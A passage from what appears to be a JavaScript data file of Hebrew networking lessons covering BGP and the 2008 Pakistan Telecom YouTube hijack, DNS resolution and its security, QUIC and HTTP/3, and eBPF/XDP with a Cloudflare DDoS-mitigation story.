sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)</code></pre></div>
<p><strong>הלקח</strong></p>
<p><code>Wireshark</code> לא מוצא באגים — הוא חושף <em>מציאות</em>.</p>
<p>הבעיה לא הייתה בקוד שלנו, אלא בהתנהגות הרשת תחת עומס.</p>
<p>בלי <code>packet capture</code> — הייתם מחפשים שבועות.</p>
</div>`
      }
    ]
  },
  {
    id: 302,
    title: "BGP — עמוד השדרה של האינטרנט",
    pages: [
      {
        type: "explanation",
        title: "iBGP ו-eBGP — שתי מציאויות",
        content: `<div dir="rtl">
<h2>BGP — הפרוטוקול שמחזיק את האינטרנט</h2>
<p><strong>BGP</strong> — <code>Border Gateway Protocol</code></p>
<p>פרוטוקול הניתוב היחיד שפועל בין <code>Autonomous Systems</code>.</p>
<p>ה-<code>Autonomous Systems</code> הם הארגונים, ספקי האינטרנט והחברות שמרכיבים יחד את האינטרנט.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 140" class="content-diagram">
  <text x="180" y="15" text-anchor="middle" font-size="12" fill="#e2e8f0" font-weight="bold">iBGP vs eBGP</text>
  <rect x="10" y="25" width="150" height="100" rx="8" fill="#1e293b" stroke="#3b82f6" stroke-width="2"/>
  <text x="85" y="42" text-anchor="middle" font-size="11" fill="#93c5fd" font-weight="bold">AS 65001 (ISP A)</text>
  <rect x="25" y="50" width="50" height="22" rx="4" fill="#1e3a5f"/>
  <text x="50" y="65" text-anchor="middle" font-size="10" fill="#7dd3fc">Router 1</text>
  <rect x="95" y="50" width="50" height="22" rx="4" fill="#1e3a5f"/>
  <text x="120" y="65" text-anchor="middle" font-size="10" fill="#7dd3fc">Router 2</text>
  <line x1="75" y1="61" x2="95" y2="61" stroke="#60a5fa" stroke-width="1.5" stroke-dasharray="4,2"/>
  <text x="85" y="56" text-anchor="middle" font-size="8" fill="#60a5fa">iBGP</text>
  <rect x="200" y="25" width="150" height="100" rx="8" fill="#1e293b" stroke="#22c55e" stroke-width="2"/>
  <text x="275" y="42" text-anchor="middle" font-size="11" fill="#86efac" font-weight="bold">AS 65002 (ISP B)</text>
  <rect x="215" y="50" width="50" height="22" rx="4" fill="#14532d"/>
  <text x="240" y="65" text-anchor="middle" font-size="10" fill="#86efac">Router 3</text>
  <rect x="285" y="50" width="50" height="22" rx="4" fill="#14532d"/>
  <text x="310" y="65" text-anchor="middle" font-size="10" fill="#86efac">Router 4</text>
  <line x1="215" y1="61" x2="285" y2="61" stroke="#4ade80" stroke-width="1.5" stroke-dasharray="4,2"/>
  <text x="250" y="56" text-anchor="middle" font-size="8" fill="#4ade80">iBGP</text>
  <line x1="145" y1="75" x2="200" y2="75" stroke="#f59e0b" stroke-width="2"/>
  <text x="172" y="70" text-anchor="middle" font-size="9" fill="#fbbf24" font-weight="bold">eBGP</text>
</svg>
</div>
<table class="content-table">
  <tr><th>פרמטר</th><th>iBGP</th><th>eBGP</th></tr>
  <tr><td>היכן פועל</td><td>בתוך <code>AS</code> אחד</td><td>בין <code>AS</code>-ים שונים</td></tr>
  <tr><td><code>TTL</code></td><td>255 — כל מסלול</td><td>1 — חייב שכן ישיר</td></tr>
  <tr><td><code>next-hop</code></td><td>לא משתנה כברירת מחדל</td><td>משתנה לכתובת ה-<code>peer</code></td></tr>
  <tr><td><code>full mesh</code></td><td>נדרש — או <code>Route Reflector</code></td><td>לא נדרש</td></tr>
  <tr><td>עדכון</td><td>לא מפרסם ל-<code>iBGP</code> אחר</td><td>מפרסם הכל</td></tr>
</table>
<p><strong>הכלל החשוב ביותר</strong></p>
<p><code>Router</code> שקיבל מסלול מ-<code>iBGP neighbor</code> <em>לא</em> שולח אותו ל-<code>iBGP</code> אחר.</p>
<p>לכן נדרש <code>full mesh</code> — או <code>Route Reflectors</code> כחלופה.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Path Selection — 13 הכללים",
        content: `<div dir="rtl">
<h2>כיצד BGP בוחר את המסלול הטוב ביותר</h2>
<p>כשה-<code>router</code> מקבל את אותו <code>prefix</code> מכמה שכנים, הוא עובר על 13 קריטריונים לפי הסדר.</p>
<p>הקריטריון הראשון שמבדיל בין המועמדים — מנצח.</p>
<table class="content-table">
  <tr><th>#</th><th>קריטריון</th><th>גבוה = עדיף</th></tr>
  <tr><td>1</td><td><code>Weight</code> — ייחודי ל-Cisco</td><td>גבוה יותר עדיף</td></tr>
  <tr><td>2</td><td><code>Local Preference</code></td><td>גבוה יותר עדיף — ברירת מחדל 100</td></tr>
  <tr><td>3</td><td>נתיב מקומי — <code>network</code> / <code>aggregate</code></td><td>עדיפות לנתיבים שלנו</td></tr>
  <tr><td>4</td><td><code>AS Path Length</code></td><td>קצר יותר עדיף</td></tr>
  <tr><td>5</td><td><code>Origin</code> — <code>IGP</code> עדיף על <code>EGP</code> עדיף על <code>?</code></td><td><code>IGP</code> עדיף</td></tr>
  <tr><td>6</td><td><code>MED</code> — <code>Multi-Exit Discriminator</code></td><td>נמוך יותר עדיף</td></tr>
  <tr><td>7</td><td><code>eBGP</code> מול <code>iBGP</code></td><td><code>eBGP</code> עדיף</td></tr>
  <tr><td>8</td><td><code>IGP metric</code> ל-<code>next-hop</code></td><td>נמוך יותר עדיף</td></tr>
  <tr><td>9-13</td><td><code>BGP Router ID</code>, <code>cluster-list</code>, <code>neighbor IP</code></td><td>שוברי שוויון</td></tr>
</table>
<p><strong>בפועל</strong></p>
<p>90% מה-<code>BGP engineering</code> מסתכם בשינוי <code>Local Preference</code> ו-<code>AS Path prepending</code>.</p>
<div class="code-preview"><pre><code># Cisco IOS — העדף ISP A על ISP B
route-map PREFER_ISPA permit 10
  set local-preference 200

# AS Path Prepending — הפוך מסלול פחות אטרקטיבי
route-map BACKUP_LINK permit 10
  set as-path prepend 65001 65001 65001</code></pre></div>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: Pakistan Telecom 2008",
        content: `<div dir="rtl">
<h2>כש-Pakistan תקפה את YouTube — בטעות</h2>
<p>24 בפברואר 2008.</p>
<p><code>Pakistan Telecom</code> קיבלה הוראה לחסום <code>YouTube</code>.</p>
<p>הפתרון שבחרו — להכניס <code>route</code> ל-<code>BGP</code> שמפנה את תעבורת <code>YouTube</code> ל-<code>black hole</code> מקומי.</p>
<p><strong>מה שקרה</strong></p>
<p>במקום לשמור את ה-<code>route</code> פנימי ב-<code>iBGP</code>, הוא דלף ל-<code>PCCW</code> — ספק האינטרנט שמעל Pakistan.</p>
<p><code>PCCW</code> הפיצה אותו לשאר העולם.</p>
<p>ברגע שזה קרה, <code>BGP</code> בחר את ה-<code>route</code> של Pakistan לכל התעבורה ל-<code>YouTube</code>.</p>
<p>הסיבה — הוא היה <em>ספציפי יותר</em>.</p>
<p><code>YouTube</code> פרסמה <code>208.65.153.0/22</code>.</p>
<p>Pakistan פרסמה <code>208.65.153.0/24</code>.</p>
<p>ב-<code>BGP</code>, <code>/24</code> ספציפי יותר מ-<code>/22</code> — ולכן מנצח תמיד.</p>
<p>תוך 2 דקות — 75% מתעבורת <code>YouTube</code> העולמית הופנתה ל-Pakistan.</p>
<p><code>YouTube</code> הייתה נגישה רק ל-25% מהמשתמשים.</p>
<p>ההפסקה נמשכה כשעתיים.</p>
<div class="code-preview"><pre><code># הroute הבעייתי (רעיונית):
# YouTube: 208.65.153.0/22 (AS 36561)
# Pakistan: 208.65.153.0/24 (AS 17557) ← יותר ספציפי, ניצח!

# BGP: Longest Prefix Match תמיד מנצח
# /24 (256 כתובות) > /22 (1024 כתובות) מבחינת BGP</code></pre></div>
<p><strong>הלקח</strong></p>
<p><code>BGP</code> הוא פרוטוקול של אמון.</p>
<p>אין אימות מובנה — כל <code>AS</code> יכול לפרסם כל <code>prefix</code>.</p>
<p><strong>RPKI</strong> — <code>Resource Public Key Infrastructure</code></p>
<p>נוצר בדיוק בגלל תקריות כאלו.</p>
<p>מאמת קריפטוגרפית ש-<code>AS</code> מורשה לפרסם <code>prefix</code> מסוים.</p>
</div>`
      }
    ]
  },
  {
    id: 303,
    title: "DNS בעומק",
    pages: [
      {
        type: "explanation",
        title: "Recursive Resolution — כל צעד",
        content: `<div dir="rtl">
<h2>מה קורה כשאתה מקליד google.com</h2>
<p><code>DNS resolution</code> נראה פשוט.</p>
<p>בפועל זה ריקוד מדויק בין 5 שחקנים שונים.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 155" class="content-diagram">
  <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">DNS Full Resolution Flow</text>
  <rect x="5" y="22" width="70" height="20" rx="4" fill="#1e3a5f"/>
  <text x="40" y="36" text-anchor="middle" font-size="9" fill="#7dd3fc">Client</text>
  <rect x="90" y="22" width="70" height="20" rx="4" fill="#1e3a5f"/>
  <text x="125" y="36" text-anchor="middle" font-size="9" fill="#7dd3fc">Recursive Resolver</text>
  <rect x="175" y="22" width="60" height="20" rx="4" fill="#14532d"/>
  <text x="205" y="36" text-anchor="middle" font-size="9" fill="#86efac">Root NS</text>
  <rect x="250" y="22" width="50" height="20" rx="4" fill="#78350f"/>
  <text x="275" y="36" text-anchor="middle" font-size="9" fill="#fcd34d">TLD NS</text>
  <rect x="310" y="22" width="45" height="20" rx="4" fill="#4c1d95"/>
  <text x="332" y="36" text-anchor="middle" font-size="9" fill="#c4b5fd">Auth NS</text>
  <line x1="40" y1="42" x2="125" y2="55" stroke="#7dd3fc" stroke-width="1" stroke-dasharray="3,2"/>
  <text x="75" y="52" font-size="8" fill="#94a3b8">①google.com?</text>
  <line x1="125" y1="55" x2="205" y2="55" stroke="#86efac" stroke-width="1"/>
  <text x="165" y="51" font-size="8" fill="#86efac">②→Root</text>
  <line x1="205" y1="62" x2="125" y2="70" stroke="#86efac" stroke-width="1" stroke-dasharray="3,2"/>
  <text x="160" y="72" font-size="8" fill="#86efac">③ .com NS</text>
  <line x1="125" y1="70" x2="275" y2="70" stroke="#fcd34d" stroke-width="1"/>
  <text x="200" y="66" font-size="8" fill="#fcd34d">④→TLD</text>
  <line x1="275" y1="77" x2="125" y2="88" stroke="#fcd34d" stroke-width="1" stroke-dasharray="3,2"/>
  <text x="195" y="88" font-size="8" fill="#fcd34d">⑤ google.com NS</text>
  <line x1="125" y1="88" x2="332" y2="88" stroke="#c4b5fd" stroke-width="1"/>
  <text x="228" y="84" font-size="8" fill="#c4b5fd">⑥→Auth</text>
  <line x1="332" y1="95" x2="125" y2="108" stroke="#c4b5fd" stroke-width="1" stroke-dasharray="3,2"/>
  <text x="228" y="110" font-size="8" fill="#c4b5fd">⑦ 142.250.x.x</text>
  <line x1="125" y1="108" x2="40" y2="120" stroke="#7dd3fc" stroke-width="1" stroke-dasharray="3,2"/>
  <text x="75" y="122" font-size="8" fill="#7dd3fc">⑧ IP: 142.250.x.x</text>
</svg>
</div>
<table class="content-table">
  <tr><th>שחקן</th><th>תפקיד</th><th>דוגמה</th></tr>
  <tr><td><code>Client</code></td><td>שולח שאילתה ל-<code>resolver</code></td><td>הדפדפן שלך</td></tr>
  <tr><td><code>Recursive Resolver</code></td><td>עושה את כל העבודה בשבילך</td><td><code>8.8.8.8</code> — Google, <code>1.1.1.1</code> — Cloudflare</td></tr>
  <tr><td><code>Root Nameserver</code></td><td>יודע רק מי אחראי על <code>TLD</code></td><td>13 אשכולות — <code>a-m.root-servers.net</code></td></tr>
  <tr><td><code>TLD Nameserver</code></td><td>יודע מי אחראי על <code>domain</code></td><td><code>Verisign</code> לכל <code>.com</code></td></tr>
  <tr><td><code>Authoritative NS</code></td><td>יודע את ה-<code>IP</code> האמיתי</td><td><code>ns1.google.com</code></td></tr>
</table>
</div>`
      },
      {
        type: "explanation",
        title: "DNSSEC, DoH, DoT — אבטחה",
        content: `<div dir="rtl">
<h2>DNS — הפרוטוקול הכי פגיע ב-stack</h2>
<p><code>DNS</code> מקורי עובד על <code>UDP</code> פורט 53.</p>
<p>ללא הצפנה וללא אימות.</p>
<p>כל מי שנמצא בדרך יכול לזייף תשובות.</p>
<h3>DNSSEC — חתימות קריפטוגרפיות</h3>
<p>כל <code>record</code> מלווה בחתימה דיגיטלית.</p>
<p>ה-<code>resolver</code> מאמת את שרשרת האמון מה-<code>Root</code> ועד ה-<code>record</code>.</p>
<div class="code-preview"><pre><code># בדיקת DNSSEC עם dig
dig +dnssec cloudflare.com

# רשומות DNSSEC:
# RRSIG — חתימה על record set
# DNSKEY — המפתח הציבורי
# DS — Delegation Signer (שרשרת אמון)
# NSEC/NSEC3 — הוכחת אי-קיום domain</code></pre></div>
<h3>DNS-over-HTTPS ו-DNS-over-TLS</h3>
<p><code>DoH</code> ו-<code>DoT</code> — שתי גישות להצפנת שאילתות <code>DNS</code>.</p>
<table class="content-table">
  <tr><th>פרוטוקול</th><th>פורט</th><th>הצפנה</th><th>פרטיות מ-ISP</th></tr>
  <tr><td><code>DNS</code> רגיל</td><td>53 / <code>UDP</code></td><td>ללא</td><td>גלוי</td></tr>
  <tr><td><code>DoT</code></td><td>853 / <code>TCP</code></td><td><code>TLS</code></td><td>מוצפן</td></tr>
  <tr><td><code>DoH</code></td><td>443 / <code>HTTPS</code></td><td><code>TLS</code></td><td>מוצפן + נראה כ-<code>HTTPS</code> רגיל</td></tr>
  <tr><td><code>DoQ</code></td><td>853 / <code>QUIC</code></td><td><code>QUIC</code></td><td>מוצפן + מהיר יותר</td></tr>
</table>
<h3><code>Anycast</code> — למה <code>8.8.8.8</code> מהיר מכל מקום</h3>
<p><code>Google</code> מפרסמת את <code>8.8.8.8</code> מעשרות מיקומים עם <code>BGP Anycast</code>.</p>
<p><code>BGP</code> תמיד מנתב ל-<code>POP</code> הקרוב ביותר.</p>
<p>מישראל אתה מדבר עם <code>datacenter</code> בישראל או אירופה — לא בארה"ב.</p>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: DNS Hijacking של ISP",
        content: `<div dir="rtl">
<h2>כשה-ISP שלך קורא את השאילתות שלך</h2>
<p>שנת 2018.</p>
<p>חוקר אבטחה גילה ש-<code>ISP</code> ישראלי מפנה שאילתות <code>DNS</code> שמחזירות שגיאה — <code>NXDOMAIN</code> — לדף החיפוש שלו.</p>
<p>זוהי גניבת תעבורה מדומיינים שגויים.</p>
<p>האם זה לגיטימי? לא ברור.</p>
<p>אבל זה הדגים עובדה חשובה — ה-<code>ISP</code> רואה הכל.</p>
<p>כל <code>domain</code> שגלשת אליו גלוי לחלוטין ב-<code>DNS</code> הרגיל.</p>
<p><strong>מתקפות DNS אמיתיות</strong></p>
<ul>
<li><strong>DNS Cache Poisoning</strong> — Kaminsky 2008 — בגלל <code>UDP</code>, אפשר לנחש את ה-<code>transaction ID</code> ולהזריק תשובה מזויפת ל-<code>cache</code> של ה-<code>resolver</code></li>
<li><strong>DNS Hijacking</strong> — שינוי הגדרות <code>DNS</code> על ה-<code>router</code> דרך סיסמת ברירת מחדל. כל הרשת מדברת עם <code>resolvers</code> זדוניים</li>
<li><strong>NXNS Attack</strong> — גורם ל-<code>recursive resolver</code> לשלוח מיליוני שאילתות ל-<code>NS</code> של הקורבן — <code>DDoS</code></li>
</ul>
<p><strong>הפתרון שהפך מקובל</strong></p>
<p><code>Cloudflare 1.1.1.1</code> עם <code>DoH</code>.</p>
<p>ה-<code>ISP</code> רואה רק <code>HTTPS</code> ל-<code>1.1.1.1</code> — לא שאילתות <code>DNS</code>.</p>
<p>חברות רבות מאמצות <code>DNS filtering</code> כמו <code>Cisco Umbrella</code> בתוך ה-<code>VPN</code> הארגוני.</p>
<p><strong>הלקח</strong></p>
<p><code>DNS</code> הוא ספר הטלפונים של האינטרנט.</p>
<p>מי ששולט בו — שולט במה שאתה מגיע אליו.</p>
</div>`
      }
    ]
  },
  {
    id: 304,
    title: "QUIC ו-HTTP/3",
    pages: [
      {
        type: "explanation",
        title: "בעיית HOL Blocking שHTTP/2 לא פתר",
        content: `<div dir="rtl">
<h2>למה HTTP/2 לא מספיק</h2>
<p><code>HTTP/2</code> הביא <code>multiplexing</code> — שליחת מספר <code>streams</code> בחיבור <code>TCP</code> אחד.</p>
<p>אבל <code>TCP</code> לא יודע שיש כמה <code>streams</code>.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
  <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">HOL Blocking — HTTP/2 vs HTTP/3</text>
  <text x="90" y="30" text-anchor="middle" font-size="10" fill="#f87171" font-weight="bold">HTTP/2 over TCP</text>
  <rect x="10" y="38" width="50" height="14" rx="3" fill="#1e3a5f"/>
  <text x="35" y="48" text-anchor="middle" font-size="8" fill="#7dd3fc">Stream 1</text>
  <rect x="65" y="38" width="50" height="14" rx="3" fill="#7f1d1d"/>
  <text x="90" y="48" text-anchor="middle" font-size="8" fill="#fca5a5">LOST ❌</text>
  <rect x="120" y="38" width="50" height="14" rx="3" fill="#374151"/>
  <text x="145" y="48" text-anchor="middle" font-size="8" fill="#9ca3af">Stream 3 ⏳</text>
  <text x="90" y="66" text-anchor="middle" font-size="9" fill="#f87171">חבילה אחת אבדה → כל הstreams מחכים!</text>
  <text x="270" y="30" text-anchor="middle" font-size="10" fill="#4ade80" font-weight="bold">HTTP/3 over QUIC</text>
  <rect x="190" y="38" width="50" height="14" rx="3" fill="#14532d"/>
  <text x="215" y="48" text-anchor="middle" font-size="8" fill="#86efac">Stream 1 ✅</text>
  <rect x="245" y="38" width="50" height="14" rx="3" fill="#7f1d1d"/>
  <text x="270" y="48" text-anchor="middle" font-size="8" fill="#fca5a5">LOST ❌</text>
  <rect x="300" y="38" width="50" height="14" rx="3" fill="#14532d"/>
  <text x="325" y="48" text-anchor="middle" font-size="8" fill="#86efac">Stream 3 ✅</text>
  <text x="270" y="66" text-anchor="middle" font-size="9" fill="#4ade80">Stream 2 אבד → רק Stream 2 מחכה!</text>
  <line x1="10" y1="80" x2="350" y2="80" stroke="#334155" stroke-width="1" stroke-dasharray="5,3"/>
  <text x="180" y="95" text-anchor="middle" font-size="10" fill="#94a3b8">QUIC = streams עצמאיים לחלוטין בתוך UDP</text>
  <text x="180" y="112" text-anchor="middle" font-size="9" fill="#64748b">אובדן חבילה ב-stream אחד לא חוסם שאר הstreams</text>
</svg>
</div>
<p>ב-<code>HTTP/2</code>, אם <code>packet</code> אחד אובד — <code>TCP</code> מחכה להחזרתו.</p>
<p>כל 10 ה-<code>streams</code> שבאותו חיבור <em>קפואים</em>.</p>
<p>זהו <strong>Head-of-Line blocking</strong> — <code>HOL blocking</code> — ברמת <code>TCP</code>.</p>
<p><code>QUIC</code> בנה <code>streams</code> עצמאיים מעל <code>UDP</code>.</p>
<p>אובדן <code>packet</code> ב-<code>stream 2</code> חוסם רק את <code>stream 2</code>.</p>
<p>שאר ה-<code>streams</code> ממשיכים.</p>
</div>`
      },
      {
        type: "explanation",
        title: "0-RTT ו-Connection Migration",
        content: `<div dir="rtl">
<h2>QUIC — מה שמבדיל אותו מ-TCP+TLS</h2>
<h3>0-RTT Connection Resumption</h3>
<p><code>TCP</code> + <code>TLS 1.3</code> = סיבוב אחד לחיבור חדש.</p>
<p>אבל עם <code>session resumption</code>, <code>QUIC</code> שולח נתונים כבר בחבילה הראשונה.</p>
<div class="code-preview"><pre><code>TCP + TLS 1.3 (חיבור ראשוני):
  SYN →
  ← SYN-ACK          (1 RTT)
  TLS ClientHello →
  ← TLS ServerHello   (2 RTT)
  נתונים →            (3 RTT!)

QUIC 0-RTT (חיבור חוזר):
  ClientHello + נתונים →  (0 RTT!)
  ← Server response</code></pre></div>
<h3>Connection Migration</h3>
<p><code>TCP</code> מזוהה לפי ארבעה שדות — <code>src IP</code>, <code>src port</code>, <code>dst IP</code>, <code>dst port</code>.</p>
<p>מעבר מ-<code>WiFi</code> לסלולרי שובר את החיבור.</p>
<p><code>QUIC</code> מזוהה לפי <strong>Connection ID</strong> אקראי.</p>
<p>מעבר מ-<code>WiFi</code> לסלולרי?</p>
<p><code>QUIC</code> ממשיך בצורה שקופה — ה-<code>stream</code> לא נקטע.</p>
<table class="content-table">
  <tr><th>תכונה</th><th>TCP+TLS</th><th>QUIC</th></tr>
  <tr><td>חיבור ראשוני</td><td>1-3 <code>RTT</code></td><td>1 <code>RTT</code></td></tr>
  <tr><td>חיבור חוזר</td><td>1 <code>RTT</code></td><td>0 <code>RTT</code></td></tr>
  <tr><td><code>HOL blocking</code></td><td>ברמת <code>TCP</code></td><td>אין</td></tr>
  <tr><td><code>Network migration</code></td><td>שובר חיבור</td><td>שקוף</td></tr>
  <tr><td>הצפנה</td><td><code>TLS</code> שכבה נפרדת</td><td>מובנה בפרוטוקול</td></tr>
</table>
<p><strong>HTTP/3</strong></p>
<p>סמנטיקת <code>HTTP/2</code> מעל <code>QUIC</code> במקום <code>TCP</code>.</p>
<p>נתמך ב-<code>Chrome</code>, <code>Firefox</code>, <code>Safari</code>, <code>nginx</code> ו-<code>Cloudflare</code>.</p>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: Google QUIC לפני שהעולם ידע",
        content: `<div dir="rtl">
<h2>איך Google בנתה QUIC בשקט ואז שינתה את האינטרנט</h2>
<p>2012.</p>
<p><code>Google</code> שמה לב ש-<code>TCP</code> הוא צוואר בקבוק אמיתי.</p>
<p>בעיקר ברשתות סלולריות עם <code>packet loss</code> גבוה.</p>
<p>הפתרון של <code>IETF</code> ייקח שנים — <code>Google</code> החליטה לפתור לבד.</p>
<p>הם בנו <code>QUIC</code> כפרוטוקול ניסיוני והפעילו אותו כברירת מחדל ב-<code>Chrome</code>.</p>
<p>המשתמשים לא ידעו — פשוט <code>YouTube</code> ו-<code>Chrome</code> הרגישו מהירים יותר.</p>
<p>2015 — כ-50% מבקשות <code>Chrome</code> עברו על <code>QUIC</code>.</p>
<p>חיבורי <code>QUIC</code> היו מהירים ב-30% ב-<code>tail latency</code> לעומת <code>TCP</code>.</p>
<p>2018 — <code>Google</code> הגישה את <code>QUIC</code> ל-<code>IETF</code> לסטנדרטיזציה.</p>
<p>ה-<code>IETF</code> שינתה הרבה — <code>IETF QUIC</code> שונה מ-<code>Google QUIC</code>.</p>
<p>2021 — <code>RFC 9000</code> הוא <code>QUIC</code> סטנדרטי. <code>RFC 9114</code> הוא <code>HTTP/3</code>.</p>
<p>2023 — כ-30% מהאתרים הגדולים תומכים ב-<code>HTTP/3</code>.</p>
<p>כל בקשה ל-<code>cloudflare.com</code>, <code>google.com</code>, <code>facebook.com</code> — כבר <code>QUIC</code>.</p>
<p><strong>הלקח</strong></p>
<p>לפעמים הדרך לשנות סטנדרט היא לא לשכנע ועדה.</p>
<p>צריך לבנות, לפרוס, לאסוף נתונים — ואז לבוא עם עובדות.</p>
<p><code>Google</code> שינתה את שכבת האינטרנט בשקט.</p>
</div>`
      }
    ]
  },
  {
    id: 305,
    title: "eBPF ורשתות בר-תכנות",
    pages: [
      {
        type: "explanation",
        title: "eBPF — תכנות הגרעין מבחוץ",
        content: `<div dir="rtl">
<h2>eBPF — הטכנולוגיה שמשנה Linux networking</h2>
<p><strong>eBPF</strong> — <code>extended Berkeley Packet Filter</code></p>
<p>מאפשר להריץ תוכניות קטנות <em>בתוך</em> ה-<code>Linux kernel</code>.</p>
<p>אין צורך לשנות קוד גרעין ולא לטעון <code>module</code>.</p>
<p>הגרעין מריץ <code>bytecode</code> שעבר אימות מוקדם.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 140" class="content-diagram">
  <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">eBPF Architecture</text>
  <rect x="10" y="22" width="160" height="30" rx="6" fill="#1e293b" stroke="#64748b"/>
  <text x="90" y="41" text-anchor="middle" font-size="10" fill="#94a3b8">User Space — eBPF Program (C)</text>
  <rect x="180" y="22" width="170" height="30" rx="6" fill="#1e293b" stroke="#64748b"/>
  <text x="265" y="41" text-anchor="middle" font-size="10" fill="#94a3b8">clang/llvm → eBPF bytecode</text>
  <line x1="180" y1="37" x2="180" y2="70" stroke="#94a3b8" stroke-width="1" stroke-dasharray="4,2"/>
  <rect x="60" y="68" width="240" height="26" rx="6" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="180" y="85" text-anchor="middle" font-size="10" fill="#93c5fd">Kernel Verifier — בודק safety (no loops, no crashes)</text>
  <line x1="180" y1="94" x2="180" y2="108" stroke="#3b82f6" stroke-width="1.5"/>
  <rect x="10" y="108" width="100" height="22" rx="4" fill="#14532d" stroke="#22c55e"/>
  <text x="60" y="123" text-anchor="middle" font-size="9" fill="#86efac">XDP Hook (NIC)</text>
  <rect x="130" y="108" width="100" height="22" rx="4" fill="#14532d" stroke="#22c55e"/>
  <text x="180" y="123" text-anchor="middle" font-size="9" fill="#86efac">TC Hook (traffic ctrl)</text>
  <rect x="250" y="108" width="100" height="22" rx="4" fill="#14532d" stroke="#22c55e"/>
  <text x="300" y="123" text-anchor="middle" font-size="9" fill="#86efac">Socket filter</text>
</svg>
</div>
<p>תוכניות <code>eBPF</code> מוכנסות ל-<code>hooks</code> בגרעין.</p>
<p><strong>ה-verifier מבטיח שלושה דברים</strong></p>
<ul>
<li>לא יגרמו קריסה</li>
<li>לא ירוצו לנצח</li>
<li>לא ייגשו לזיכרון לא מורשה</li>
</ul>
<h3>Maps — תקשורת <code>kernel</code> מול <code>user space</code></h3>
<div class="code-preview"><pre><code>// eBPF program (C)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, __u32);   // source IP
    __type(value, __u64); // packet count
} packet_count SEC(".maps");

SEC("xdp")
int count_packets(struct xdp_md *ctx) {
    struct iphdr *ip = /* parse IP header */;
    __u64 *count = bpf_map_lookup_elem(&packet_count, &ip->saddr);
    if (count) (*count)++;
    return XDP_PASS;
}</code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "XDP ו-Cilium — use cases",
        content: `<div dir="rtl">
<h2>מה עושים עם eBPF בפועל</h2>
<h3>XDP — <code>eXpress Data Path</code></h3>
<p><code>XDP</code> פועל על ה-<code>NIC driver</code> — לפני שה-<code>packet</code> מגיע ל-<code>kernel network stack</code>.</p>
<p>המהירות — עשרות מיליוני <code>packets</code> לשנייה עם <code>CPU</code> בודד.</p>
<table class="content-table">
  <tr><th>XDP Action</th><th>מה עושה</th></tr>
  <tr><td><code>XDP_DROP</code></td><td>זורק <code>packet</code> מיידית — הגנת <code>DDoS</code> בלי <code>kernel overhead</code></td></tr>
  <tr><td><code>XDP_PASS</code></td><td>מעביר ל-<code>kernel stack</code> — עיבוד רגיל</td></tr>
  <tr><td><code>XDP_TX</code></td><td>שולח בחזרה מאותו <code>interface</code> — <code>hairpin</code></td></tr>
  <tr><td><code>XDP_REDIRECT</code></td><td>מפנה ל-<code>interface</code> אחר — <code>load balancing</code> מהיר</td></tr>
</table>
<h3>Cilium — <code>Kubernetes Networking</code> עם <code>eBPF</code></h3>
<p><code>Cilium</code> מחליף את <code>iptables</code> ב-<code>Kubernetes</code> לחלוטין.</p>
<p><code>iptables</code> = חיפוש ליניארי <code>O(n)</code> עם רשימות ענקיות.</p>
<p><code>eBPF maps</code> = חיפוש ב-<code>O(1)</code> עם <code>hash lookup</code>.</p>
<div class="code-preview"><pre><code># בדיקה שCilium תקין
cilium status
cilium endpoint list

# כלי observability שמגיע עם Cilium
hubble observe --namespace production
# רואה: src pod → dst pod, protocol, verdict (allow/drop)</code></pre></div>
<h3>כלים נוספים</h3>
<ul>
<li><strong>bpftrace</strong> — שפת סקריפטים ל-<code>eBPF</code>, כמו <code>DTrace</code></li>
<li><strong>libbpf</strong> — ספריית <code>C</code> לפיתוח תוכניות <code>eBPF</code></li>
<li><strong>Falco</strong> — זיהוי איומי אבטחה עם <code>eBPF</code> — ניטור <code>syscalls</code></li>
<li><strong>Pixie</strong> — נראות אפליקציה ללא שינויי קוד</li>
</ul>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: Cloudflare עוצרת DDoS עם eBPF",
        content: `<div dir="rtl">
<h2>כשגל של 800Gbps הגיע — ובכל זאת נשארנו online</h2>
<p>ספטמבר 2022.</p>
<p><code>Cloudflare</code> דיווחה על מתקפת <code>DDoS</code> של 2.5 מיליארד <code>packets</code> לשנייה.</p>
<p>בגישה הישנה עם <code>iptables</code>, כל <code>rule</code> הוא סריקה ליניארית.</p>
<p>10,000 כללים = 10,000 בדיקות לכל <code>packet</code>.</p>
<p>בלתי אפשרי בקנה מידה כזה.</p>
<p><code>Cloudflare</code> בנתה מערכת מבוססת <code>XDP</code>.</p>
<p>כל תעבורה מנותחת ב-<code>eBPF</code> עוד על כרטיס הרשת.</p>
<p><strong>טביעת אצבע של תעבורת DDoS מזוהה מיד</strong></p>
<ul>
<li><code>TTL</code> חריג</li>
<li><code>IP options</code> חשודים</li>
<li>התפלגות גדלי <code>packets</code> לא טבעית</li>
</ul>
<p>תוצאת הזיהוי — <code>XDP_DROP</code>.</p>
<p>ה-<code>packet</code> נזרק לפני שנוגע בגרעין.</p>
<p>תוך 20 שניות מזיהוי — 2.5 מיליארד <code>packets</code> לשנייה נזרקו.</p>
<p>תשתית <code>Cloudflare</code> המשיכה לשרת תעבורה לגיטימית ללא הפרעה.</p>
<div class="code-preview"><pre><code># pseudocode של Cloudflare XDP DDoS mitigation
SEC("xdp")
int mitigate_ddos(struct xdp_md *ctx) {
    // Parse IP header
    if (is_spoofed_source_ip(ip->saddr))
        return XDP_DROP;

    // Rate limiting per-IP using BPF map
